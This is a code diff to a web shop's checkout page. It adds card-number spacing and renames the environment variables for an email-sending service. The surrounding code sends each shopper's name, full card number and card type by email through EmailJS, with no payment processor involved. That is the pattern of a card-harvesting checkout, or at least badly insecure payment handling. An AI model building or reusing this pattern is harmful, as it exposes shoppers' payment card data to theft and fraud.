@@ -34,6 +34,14 @@ export default function CheckoutPage() {
     setFormData({ ...formData, expiry: value });
   };
 
+  // Card number input with spacing (1234 5678 9012 3456)
+  const handleCardNumberChange = (e) => {
+    let value = e.target.value.replace(/\D/g, ''); // only digits
+    value = value.substring(0, 16); // max 16 digits
+    value = value.replace(/(.{4})/g, '$1 ').trim(); // group in 4s
+    setFormData({ ...formData, cardNumber: value });
+  };
+
   // Handle card select
   const handleCardSelect = (type) => {
     setCardType(type);
@@ -46,8 +54,8 @@ export default function CheckoutPage() {
   const handleCheckout = async () => {
     try {
       const result = await emailjs.send(
-        process.env.service_svegc0i,
-        process.env.template_qquocc7,
+        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
+        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
         {
           name: formData.name,
           card_number: formData.cardNumber,
@@ -56,7 +64,7 @@ export default function CheckoutPage() {
           card_type: cardType,
           amount: '$39.99',
         },
-        process.env.VjoUAxDSePXGF9KMD
+        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY
       );
 
       console.log('✅ Email sent successfully:', result);
@@ -124,9 +132,10 @@ export default function CheckoutPage() {
           <input
             name="cardNumber"
             value={formData.cardNumber}
-            onChange={handleChange}
+            onChange={handleCardNumberChange}
             className="w-full border p-2 mb-4 rounded"
-            placeholder="1234 1234 1234 1234"
+            placeholder="1234 5678 9012 3456"
+            maxLength={19}
           />
 
           <div className="flex gap-4 mb-4">
